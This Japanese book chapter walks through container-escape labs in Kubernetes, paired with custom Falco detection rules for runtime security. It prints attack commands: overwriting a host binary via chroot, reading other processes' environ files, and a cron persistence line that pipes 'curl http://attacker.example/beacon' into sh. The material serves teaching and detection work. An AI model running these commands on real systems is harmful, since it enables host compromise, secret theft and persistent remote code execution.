---
title: "第7章：Container Escape - ホスト境界の突破"
---

# 第7章：Container Escape - ホスト境界の突破

## この章で学ぶこと

- コンテナランタイムが前提とする境界モデルと、それが崩れる条件
- Lab 10〜12の実験手順とFalcoでの観測結果（実機検証）
- ホストに到達した攻撃者が最初に行う初動の検知ポイント

ここまでの章は「コンテナの中」で完結する話が中心でしたが、本章ではついに**コンテナとホストを隔てる境界そのもの**が突破される瞬間を扱います。MITRE ATT&CK for Containersの**Escape to Host**戦術に対応します。

---

## コンテナランタイムの境界モデル

コンテナは「隔離された環境」ではなく、**Linux Namespace / cgroups / Capabilities によって制限された、同じカーネルを共有するプロセス**です。この前提を崩す条件は大きく3つに整理できます。

![図7-1：コンテナランタイムの境界モデルが崩れる条件](/images/fig-ch07-escape-causes.png)

第6章のLab 7（特権コンテナ・hostPath）もこの境界モデルの崩れの一種でしたが、本章ではさらに踏み込み、**既知のエスケープ手法の再現**と、**エスケープ後の初動**まで扱います。

## Lab 10: 既知のエスケープ手法の再現（ホストバイナリ書き換え）

- **MITRE ATT&CK for Containers**: T1611 (Escape to Host)
- **前提**: 実際のCVE（CVE-2019-5736等）の再現は、脆弱な旧バージョンrunc等の特別な環境構築が必要で実機検証の範囲を超えるため、**「エスケープが成功した結果として何が起きるか」＝ホストバイナリの書き換え**を、Lab 7の特権コンテナ（hostPath `/`マウント）から`chroot`して再現

```bash
kubectl -n lab exec misconfigured-pod -- sh -c \
  "chroot /host sh -c 'cp /usr/bin/true /tmp/true.bak && echo overwritten >> /usr/bin/true && cp /tmp/true.bak /usr/bin/true'"
```

**結果**: ホスト側の`/usr/bin/true`への書き込みが成功した。

### 実機検証で判明した訂正：「Write below binary dir」ルールは実在しない

`falco_rules.yaml`全体を検索したが、**rule名に"binary dir"を含むものは1件も存在しなかった**。「ホストのバイナリが書き換えられたこと」自体を検知する標準ルールは無い——これはFalco標準ルールセットの**実在するカバレッジの穴**。

### カスタムルールの試行錯誤（2回失敗して成功）

1本目：`fd.name startswith "/host/usr/bin"`（hostPathマウント経由のパスを想定）→ **発火せず**。原因は、`chroot /host`した時点でプロセスの見る絶対パスが`/usr/bin/true`に変わり、`/host`プレフィックスは付かないこと。

2本目（修正版・実機確認済み）：

```yaml
- rule: Write to System Binary Directory
  condition: >
    open_write and container
    and (fd.name startswith /usr/bin or fd.name startswith /usr/sbin
         or fd.name startswith /bin or fd.name startswith /sbin)
```

```
Critical Write to system binary directory (file=/usr/bin/true
  command=sh -c cp /usr/bin/true /tmp/true.bak && ... pod=misconfigured-pod ns=lab)
```

**考察**: 「Write below binary dir」という標準ルール名の記述は削除し、「このカテゴリの検知は標準ルールセットに存在しない」ことを明記する。カスタムルールを書く際の典型的な落とし穴として、**「`chroot`後はパスの見え方が変わる」**という点が、Lab 4（私設IP除外）と並ぶ"素朴な実装が通用しない"実例になった。

## Lab 11: 共有Namespace/Volumeの悪用

- **MITRE ATT&CK for Containers**: T1611
- **前提**: `host-pid-pod`（`hostPID: true`のみ）

### 実機検証で判明した重大な誤り：hostPIDだけでは他プロセスのenvironを読めない

当初「hostPID: trueで他プロセスの環境変数に直接アクセスできる」と書いていたが、実機では**`CAP_SYS_PTRACE`を持たない通常のコンテナは`Permission denied`で弾かれた**：

```bash
kubectl -n lab exec host-pid-pod -- sh -c "cat /proc/245/environ"
# cat: can't open '/proc/245/environ': Permission denied
```

`ps aux`で他ノードの全プロセスが**見える**ことは事実だが、`/proc/<pid>/environ`のような機微なファイルへの実際のアクセスには、カーネルの`ptrace_may_access`チェックが働き、**`hostPID`単体ではなく追加で`CAP_SYS_PTRACE`（第6章Lab 9の権限）が必要**だった。`hostPID` + `CAP_SYS_PTRACE`を持つ`host-pid-ptrace-pod`で再実行すると成功する：

```bash
kubectl -n lab exec host-pid-ptrace-pod -- sh -c "cat /proc/245/environ | tr '\0' '\n' | head -3"
```

```
HTTPS_PROXY=
HTTP_PROXY=
LANG=C.UTF-8
```

### カスタムルールの試行錯誤：自分自身のノイズに埋もれる

本文の「Read Environ of Other Process」ルールも実在しない。カスタムルール追加では、**実運用上重要なノイズ問題**に遭遇した。最初の実装は、**Falco自身が`/host/proc`経由で全ホストプロセスのenvironを定期的に読み取っている**ため、1分間に約1000件のアラートを誤発火させた。`proc.name != falco`と`/host/proc`配下の除外を加えて修正：

```yaml
condition: >
  open_read and container
  and fd.name contains "/proc/" and fd.name contains "/environ"
  and not fd.name contains "self"
  and not fd.name startswith "/host/proc"
  and proc.name != falco
```

```
Warning Read /proc/<pid>/environ (file=/proc/245/environ
  command=cat /proc/245/environ container=app pod=host-pid-ptrace-pod ns=lab)
```

**考察**: 「hostPIDだけで他プロセスの機微ファイルを読める」という前提は不正確。**実際には`hostPID`（可視性）＋`CAP_SYS_PTRACE`（アクセス権）の組み合わせが必要**という、より正確な記述に修正する。カスタムルール開発における「Falco自身の動作が検知対象と見分けがつかなくなる」という新種のノイズ問題も追加の学びとして記録する。

## Lab 12: ホスト到達後の初動（永続化）

- **MITRE ATT&CK for Containers**: T1543, T1053
- **前提**: Lab 10で得たホストアクセスから、永続化のためホスト側のcronを書き換える

```bash
kubectl -n lab exec misconfigured-pod -- sh -c \
  "chroot /host sh -c 'echo \"* * * * * root curl http://attacker.example/beacon | sh\" >> /etc/cron.d/system-check'"
```

**結果**: `/etc/cron.d/system-check`への追記が成功。

### 実機検証で判明した訂正：「Scheduled Task Creation on Host」ルールも実在しない

Lab 10と同じパターン。`cron_binaries`というリストは存在するが、これは**cron自身がシェルを起動しても警告しないようにするための除外リスト**であり、検知対象ではない。

カスタムルール（Lab 10の教訓：post-chrootの絶対パスを使う、を反映した一発成功版）：

```yaml
- rule: Scheduled Task File Modified
  condition: >
    open_write and container
    and (fd.name startswith /etc/cron.d or fd.name startswith /etc/cron.daily
         or fd.name startswith /etc/cron.hourly or fd.name=/etc/crontab
         or fd.name startswith /etc/systemd/system)
```

```
Critical Scheduled task file modified (file=/etc/cron.d/system-check2
  command=sh -c echo "* * * * * root curl ..." >> /etc/cron.d/system-check2
  container=app pod=misconfigured-pod ns=lab)
```

**考察**: 「ホストへの永続化は一般的なホストセキュリティの検知ロジックがそのまま有効」という当初の結論は、**標準ルールセットには該当ロジックが実在しない**ため撤回する。正しくは「カスタムルールを書けば検知できるが、標準ルールセットにはcron/systemd永続化を見るルールが用意されていない」という、Lab 10・12に共通する**持続的脅威への備えの手薄さ**として書き直す。

---

## 本章のまとめ

| Lab | 手法 | 標準ルールで検知 | カスタムルールで検知 | 検知の鍵 |
|---|---|---|---|---|
| 10 | 既知エスケープ手法の再現（バイナリ書き換え） | ❌ | ✅（2回目で成功） | chroot後のパス変化に注意 |
| 11 | hostPID/Volume共有の悪用 | ❌ | ✅（ノイズ対策後） | hostPIDだけでは不十分、ptrace権限も必要 |
| 12 | ホスト到達後の初動（永続化） | ❌ | ✅（一発成功） | Lab10の教訓を活かした実装 |

Container Escapeフェーズは、**標準ルールセットに「結果としてのホスト改ざん」を見るルールが体系的に欠けている**ことが3Lab通じて一貫して判明しました。次章では、エスケープせずともクラスタ内で広がっていく「Lateral Movement」を扱います。

## 参考資料

- [MITRE ATT&CK T1611: Escape to Host](https://attack.mitre.org/techniques/T1611/)
- [CVE-2019-5736（runc）- NVD](https://nvd.nist.gov/vuln/detail/CVE-2019-5736)
- [Falco Default Rules（falcosecurity/rules）](https://github.com/falcosecurity/rules)
- [Linux namespaces(7) — manual page](https://man7.org/linux/man-pages/man7/namespaces.7.html)
- [k8s-attack-runtime-security-lab（本書の実験コード一式）](https://github.com/keitahigaki-prog/k8s-attack-runtime-security-lab)
